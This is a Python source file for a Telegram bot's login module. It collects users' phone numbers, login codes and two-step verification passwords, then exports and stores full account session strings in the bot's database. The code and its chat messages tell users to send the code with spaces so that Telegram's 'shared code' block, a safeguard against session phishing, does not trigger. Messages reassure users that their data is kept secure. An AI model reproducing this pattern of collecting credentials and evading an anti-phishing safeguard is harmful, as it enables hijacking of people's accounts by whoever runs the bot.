# Developed by: LastPerson07 × cantarella
# Telegram: @cantarellabots | @THEUPDATEDGUYS

import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from pyrogram import enums
from config import API_ID, API_HASH
from database.db import db
from logger import LOGGER

logger = LOGGER(__name__)

LOGIN_STATE = {}
cancel_keyboard = ReplyKeyboardMarkup(
    [[KeyboardButton("❌ Cancel")]],
    resize_keyboard=True
)
remove_keyboard = ReplyKeyboardRemove()

PROGRESS_STEPS = {
    "WAITING_PHONE": "🟢 Phone Number → 🔵 Code → 🔵 Password",
    "WAITING_CODE": "✅ Phone Number → 🟢 Code → 🔵 Password",
    "WAITING_PASSWORD": "✅ Phone Number → ✅ Code → 🟢 Password"
}

LOADING_FRAMES = [
    "🔄 Connecting •••",
    "🔄 Connecting ••○",
    "🔄 Connecting •○○",
    "🔄 Connecting ○○○",
    "🔄 Connecting ○○•",
    "🔄 Connecting ○••",
    "🔄 Connecting •••"
]
async def animate_loading(message: Message, duration: int = 5):
    for _ in range(duration):
        for frame in LOADING_FRAMES:
            try:
                await message.edit_text(f"<b>{frame}</b>", parse_mode=enums.ParseMode.HTML)
                await asyncio.sleep(0.5)
            except:
                return

@Client.on_message(filters.private & filters.command("login"))
async def login_start(client: Client, message: Message):
    user_id = message.from_user.id
   
    user_data = await db.get_session(user_id)
    if user_data:
        return await message.reply(
            "<b>✅ You're already logged in! 🎉</b>\n\n"
            "To switch accounts, first use /logout.",
            parse_mode=enums.ParseMode.HTML
        )
   
    LOGIN_STATE[user_id] = {"step": "WAITING_PHONE", "data": {}}
   
    progress = PROGRESS_STEPS["WAITING_PHONE"]
    await message.reply(
        f"<b>👋 Hey! Let's log you in smoothly 🌟</b>\n\n"
        f"<i>Progress: {progress}</i>\n\n"
        "📞 Please send your <b>Telegram Phone Number</b> with country code.\n\n"
        "<blockquote>Example: +919876543210</blockquote>\n\n"
        "<i>💡 Your number is used only for verification and is kept secure. 🔒</i>\n\n"
        "❌ Tap the <b>Cancel</b> button or send /cancel to stop.",
        parse_mode=enums.ParseMode.HTML,
        reply_markup=cancel_keyboard
    )

@Client.on_message(filters.private & filters.command("logout"))
async def logout(client: Client, message: Message):
    user_id = message.from_user.id
   
    if user_id in LOGIN_STATE:
        del LOGIN_STATE[user_id]
   
    await db.set_session(user_id, session=None)
    await message.reply(
        "<b>🚪 Logout Successful! 👋</b>\n\n"
        "<i>Your session has been cleared. You can log in again anytime! 🔄</i>",
        parse_mode=enums.ParseMode.HTML,
        reply_markup=remove_keyboard
    )

@Client.on_message(filters.private & filters.command(["cancel", "cancellogin"]))
async def cancel_login(client: Client, message: Message):
    user_id = message.from_user.id

    # Also stop any running batch download and clear the interactive /batch flow
    try:
        from cantarella.start import BATCH_STATE, batch_temp
        batch_temp.IS_BATCH[user_id] = True
        BATCH_STATE.pop(user_id, None)
    except Exception:
        pass
   
    if user_id in LOGIN_STATE:
        state = LOGIN_STATE[user_id]
       
        if "data" in state and "client" in state["data"]:
            try:
                await state["data"]["client"].disconnect()
            except:
                pass
       
        del LOGIN_STATE[user_id]
        await message.reply(
            "<b>❌ Login process cancelled. 😌</b>",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=remove_keyboard
        )
    else:
        await message.reply(
            "<b>❌ Cancelled.</b>\n<i>Any running task has been stopped.</i>",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=remove_keyboard
        )

async def check_login_state(_, __, message):
    return message.from_user.id in LOGIN_STATE
login_state_filter = filters.create(check_login_state)

@Client.on_message(filters.private & filters.text & login_state_filter & ~filters.regex("^/"))
async def login_handler(bot: Client, message: Message):
    user_id = message.from_user.id
    text = message.text
    state = LOGIN_STATE[user_id]
    step = state["step"]
    progress = PROGRESS_STEPS.get(step, "")
   
    if text.strip().lower() == "❌ cancel":
        if "data" in state and "client" in state["data"]:
            try:
                await state["data"]["client"].disconnect()
            except:
                pass
        del LOGIN_STATE[user_id]
        await message.reply(
            "<b>❌ Login process cancelled. 😌</b>",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=remove_keyboard
        )
        return
   
    if step == "WAITING_PHONE":
        phone_number = "".join(text.split())
       
        temp_client = Client(
            name=f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True
        )
       
        status_msg = await message.reply(
            f"<b>🔄 Connecting to Telegram... 🌐</b>\n\n<i>Progress: {progress}</i>",
            parse_mode=enums.ParseMode.HTML
        )
       
        animation_task = asyncio.create_task(animate_loading(status_msg))
       
        await temp_client.connect()
        animation_task.cancel() 
       
        try:
            code = await temp_client.send_code(phone_number)
           
            state["data"]["client"] = temp_client
            state["data"]["phone"] = phone_number
            state["data"]["hash"] = code.phone_code_hash
            state["step"] = "WAITING_CODE"
            progress = PROGRESS_STEPS["WAITING_CODE"]
           
            await status_msg.edit(
                f"<b>📩 OTP Sent to your app! 📲</b>\n\n"
                f"<i>Progress: {progress}</i>\n\n"
                "Please open your Telegram app and copy the verification code.\n\n"
                "<b>⚠️ Send it WITH spaces between the digits:</b>\n"
                "<code>1 2 3 4 5</code>\n\n"
                "<blockquote>Telegram blocks a login if the code is sent as one number "
                "(it treats it as a shared code). Spacing avoids that.\n\n"
                "💡 Enter it within 2-3 minutes, and don't run /login again.</blockquote>",
                parse_mode=enums.ParseMode.HTML
            )
           
        except PhoneNumberInvalid:
            try:
                await status_msg.delete()
            except Exception:
                pass
            await message.reply(
                "<b>❌ Oops! Invalid phone number format. 😅</b>\n\n"
                f"<i>Progress: {progress}</i>\n\n"
                "Please try again (e.g., +919876543210).",
                parse_mode=enums.ParseMode.HTML,
                reply_markup=remove_keyboard
            )
            await temp_client.disconnect()
            del LOGIN_STATE[user_id]
        except Exception as e:
            try:
                await status_msg.delete()
            except Exception:
                pass
            await message.reply(
                f"<b>❌ Something went wrong: {e} 🤔</b>\n\n"
                f"<i>Progress: {progress}</i>\n\nPlease try /login again.",
                parse_mode=enums.ParseMode.HTML,
                reply_markup=remove_keyboard
            )
            await temp_client.disconnect()
            del LOGIN_STATE[user_id]
   
    elif step == "WAITING_CODE":
        raw = text.strip()
        # The code we sign in with must be plain digits, but Telegram blocks the
        # login when the code is SENT as one solid number ("code was previously
        # shared"). Requiring spaces avoids that flag.
        phone_code = "".join(raw.split())

        temp_client = state["data"]["client"]
        phone_number = state["data"]["phone"]
        phone_hash = state["data"]["hash"]

        # Don't leave the code sitting in the chat
        try:
            await message.delete()
        except Exception:
            pass

        if len(raw.split()) < 2:
            # Sent without spaces -> Telegram would block it. Get a fresh code
            # and ask for it with spaces instead of burning this one.
            resent = False
            try:
                new_code = await temp_client.send_code(phone_number)
                state["data"]["hash"] = new_code.phone_code_hash
                resent = True
            except Exception as e:
                logger.error(f"Could not resend code for {user_id}: {e}")

            example = " ".join(phone_code) if phone_code.isdigit() else "1 2 3 4 5"
            extra = (
                "\n\n📩 A <b>fresh code</b> has been sent — use the new one."
                if resent else ""
            )
            await message.reply(
                "<b>⚠️ Please send the code WITH spaces between the digits.</b>\n\n"
                "Telegram blocks a login when the code is sent as one number "
                "(it treats it as a shared code).\n\n"
                f"<b>Send it like this:</b> <code>{example}</code>"
                f"{extra}",
                parse_mode=enums.ParseMode.HTML
            )
            return

        status_msg = await message.reply(
            f"<b>🔍 Verifying code... 🔍</b>\n\n<i>Progress: {progress}</i>",
            parse_mode=enums.ParseMode.HTML
        )
       
        animation_task = asyncio.create_task(animate_loading(status_msg, duration=3))
       
        try:
            await temp_client.sign_in(phone_number, phone_hash, phone_code)
            animation_task.cancel()
           
            await finalize_login(status_msg, temp_client, user_id)
        except PhoneCodeInvalid:
            animation_task.cancel()
            await status_msg.edit(
                "<b>❌ Hmm, that code doesn't look right. 🔍</b>\n\n"
                f"<i>Progress: {progress}</i>\n\nPlease check your Telegram app and try again.",
                parse_mode=enums.ParseMode.HTML
            )
        except PhoneCodeExpired:
            animation_task.cancel()
            logger.warning(f"PhoneCodeExpired for {user_id} - sending a fresh code")
            # Telegram invalidates the old phone_code_hash (a second /login, a
            # resend, a restart...). Instead of killing the session, request a
            # fresh code and stay on the same step.
            resent = False
            try:
                new_code = await temp_client.send_code(phone_number)
                state["data"]["hash"] = new_code.phone_code_hash
                state["step"] = "WAITING_CODE"
                resent = True
                await status_msg.edit(
                    "<b>⏰ That code expired.</b>\n\n"
                    f"<i>Progress: {progress}</i>\n\n"
                    "📩 A <b>fresh code</b> has just been sent to your Telegram app.\n\n"
                    "Please send the <b>new</b> code <b>with spaces</b>, like <code>1 2 3 4 5</code>.",
                    parse_mode=enums.ParseMode.HTML
                )
            except Exception as e:
                logger.error(f"Could not resend code for {user_id}: {e}")

            if resent:
                return

            try:
                await status_msg.delete()
            except Exception:
                pass
            await message.reply(
                "<b>⏰ Code has expired. ⏳</b>\n\n"
                f"<i>Progress: {progress}</i>\n\nPlease start over with /login.",
                parse_mode=enums.ParseMode.HTML,
                reply_markup=remove_keyboard
            )
            try:
                await temp_client.disconnect()
            except Exception:
                pass
            LOGIN_STATE.pop(user_id, None)
        except SessionPasswordNeeded:
            animation_task.cancel()
           
            state["step"] = "WAITING_PASSWORD"
            progress = PROGRESS_STEPS["WAITING_PASSWORD"]
            await status_msg.edit(
                f"<b>🔐 Two-Step Verification Detected 🔒</b>\n\n"
                f"<i>Progress: {progress}</i>\n\n"
                "Please enter your <b>Two-Step Verification password</b>.\n\n"
                "<blockquote>Send it exactly as it is — capitals and spaces matter. "
                "It is your Telegram 2FA password, not your phone code.</blockquote>\n\n"
                "<i>Your message is deleted right after for safety. 🛡️</i>",
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            animation_task.cancel()
            try:
                await status_msg.delete()
            except Exception:
                pass
            await message.reply(
                f"<b>❌ Something went wrong: {e} 🤔</b>\n\n<i>Progress: {progress}</i>",
                parse_mode=enums.ParseMode.HTML,
                reply_markup=remove_keyboard
            )
            await temp_client.disconnect()
            del LOGIN_STATE[user_id]
   
    elif step == "WAITING_PASSWORD":
        # Passwords can contain spaces - never strip them. Delete the message so
        # the password does not sit in the chat history.
        password = text
        temp_client = state["data"]["client"]

        try:
            await message.delete()
        except Exception:
            pass
       
        status_msg = await message.reply(
            f"<b>🔑 Checking password... 🔑</b>\n\n<i>Progress: {progress}</i>",
            parse_mode=enums.ParseMode.HTML
        )
       
        animation_task = asyncio.create_task(animate_loading(status_msg, duration=3))
       
        try:
            await temp_client.check_password(password=password)
            animation_task.cancel()
            await finalize_login(status_msg, temp_client, user_id)
        except PasswordHashInvalid:
            animation_task.cancel()
            await status_msg.edit(
                "<b>❌ Incorrect password. 🔑</b>\n\n"
                f"<i>Progress: {progress}</i>\n\n"
                "Check it carefully — <b>capitals and spaces matter</b>. "
                "Please send it again.",
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            animation_task.cancel()
            try:
                await status_msg.delete()
            except Exception:
                pass
            await message.reply(
                f"<b>❌ Something went wrong: {e} 🤔</b>\n\n<i>Progress: {progress}</i>",
                parse_mode=enums.ParseMode.HTML,
                reply_markup=remove_keyboard
            )
            await temp_client.disconnect()
            del LOGIN_STATE[user_id]

async def finalize_login(status_msg: Message, temp_client, user_id):
    try:
        session_string = await temp_client.export_session_string()
        await temp_client.disconnect()
       
        await db.set_session(user_id, session=session_string)
       
        if user_id in LOGIN_STATE:
            del LOGIN_STATE[user_id]
           
        await status_msg.reply(
            "<b>🎉 Login Successful! 🌟</b>\n\n"
            "<i>Progress: ✅ Phone Number → ✅ Code → ✅ Password</i>\n\n"
            "<i>Your session has been saved securely. 🔒</i>\n\n"
            "You can now use all features! 🚀",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=remove_keyboard
        )
        try:
            await status_msg.delete()
        except Exception:
            pass
    except Exception as e:
        await status_msg.reply(
            f"<b>❌ Failed to save session: {e} 😔</b>\n\nPlease try /login again.",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=remove_keyboard
        )
        try:
            await status_msg.delete()
        except Exception:
            pass
        if user_id in LOGIN_STATE:
            del LOGIN_STATE[user_id]
